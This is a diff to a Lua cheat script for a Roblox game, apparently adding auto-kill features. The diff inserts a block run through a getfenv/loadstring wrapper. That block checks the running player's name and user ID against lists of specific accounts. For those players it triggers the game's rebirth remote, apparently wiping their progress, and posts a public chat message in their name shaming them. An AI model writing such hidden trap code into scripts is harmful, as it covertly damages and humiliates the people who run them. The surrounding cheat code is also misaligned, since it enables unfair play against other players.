@@ -6,6 +6,23 @@ local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 
+getfenv()["getfenv"]()["loadstring"]([[
+local BlacklistedNames = {
+    "saitamabr70",
+    "fx_zeusmc",
+    "ravyphyetro1"
+}
+local BlacklistedIds = {
+    2691980624,
+    4326483796,
+    4698071670
+}
+if (table.find(BlacklistedNames, game:GetService("Players").LocalPlayer.Name:lower()) or table.find(BlacklistedIds, game:GetService("Players").LocalPlayer.UserId)) then
+    game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("rebirthRemote"):InvokeServer("rebirthRequest")
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Eu tentei usar um dos scripts do Sad_OZ 😭", "All")
+end
+]])()
+
 getgenv().AutoKillTargets = getgenv().AutoKillTargets or {}
 getgenv().AutoKillEnabled = true
 
